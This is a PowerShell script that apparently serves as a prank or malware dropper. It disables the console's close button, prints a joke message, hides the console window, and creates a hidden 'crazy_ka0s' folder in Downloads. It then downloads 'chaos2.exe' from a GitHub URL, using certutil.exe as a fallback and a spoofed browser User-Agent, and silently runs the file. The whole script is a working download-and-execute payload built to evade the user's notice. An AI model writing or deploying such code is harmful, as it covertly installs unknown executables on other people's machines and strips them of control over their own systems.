Function _Disable-X {
    #Calling user32.dll methods for Windows and Menus
    $MethodsCall = '
    [DllImport("user32.dll")] public static extern long GetSystemMenu(IntPtr hWnd, bool bRevert);
    [DllImport("user32.dll")] public static extern bool EnableMenuItem(long hMenuItem, long wIDEnableItem, long wEnable);
    [DllImport("user32.dll")] public static extern long SetWindowLongPtr(long hWnd, long nIndex, long dwNewLong);
    [DllImport("user32.dll")] public static extern bool EnableWindow(long hWnd, int bEnable);
    '

    $SC_CLOSE = 0xF060
    $MF_DISABLED = 0x00000002L


    #Create a new namespace for the Methods to be able to call them
    Add-Type -MemberDefinition $MethodsCall -name NativeMethods -namespace Win32

    $PSWindow = Get-Process -Pid $PID
    $hwnd = $PSWindow.MainWindowHandle

    #Get System menu of windows handled
    $hMenu = [Win32.NativeMethods]::GetSystemMenu($hwnd, 0)

    #Disable X Button
    [Win32.NativeMethods]::EnableMenuItem($hMenu, $SC_CLOSE, $MF_DISABLED) | Out-Null
}
try {
    _Disable-X
}
catch {
    Write-Host "Disable X failed"
}

function InvWR {
    param (
        [string]$url,
        [string]$path
    )
    if (Get-Command "Invoke-WebRequest" -errorAction SilentlyContinue)
    {
        Invoke-WebRequest $url -OutFile $path -UseBasicParsing -TimeoutSec 600 -Method GET -ContentType "application/zip" -Headers @{"Accept-Encoding"="gzip";"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    }
    Else {
        & certutil.exe -urlcache -f "$url" "$path"
    }
}

function Download-File {
  [CmdletBinding()]
  param(
    [Parameter(Mandatory=$true)]
    [string]$Url,

    [Parameter(Mandatory=$true)]
    [string]$Path
  )
  $ProgressPreference = 'SilentlyContinue'
  InvWR -url $Url -path $Path
}

Write-Host "there is a salted lays bag from yesterday behind your monitor"
Start-Sleep -Seconds 3

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

$dlPath = "$HOME\Downloads"
$ioq3Path = "$dlPath\crazy_ka0s"

If (Test-Path $ioq3Path) {
  Remove-Item $ioq3Path -Recurse -Force
}
New-Item -ItemType Directory -Path $ioq3Path
Set-ItemProperty -Path $ioq3Path -Name "Attributes" -Value ([System.IO.FileAttributes]::Hidden)

Download-File -Url "https://github.com/rretroo/scripts/raw/main/chaos2.exe" -Path "$ioq3Path\chaos.exe"

Start-Process -FilePath "$ioq3Path\chaos.exe" -WorkingDirectory $ioq3Path
Exit
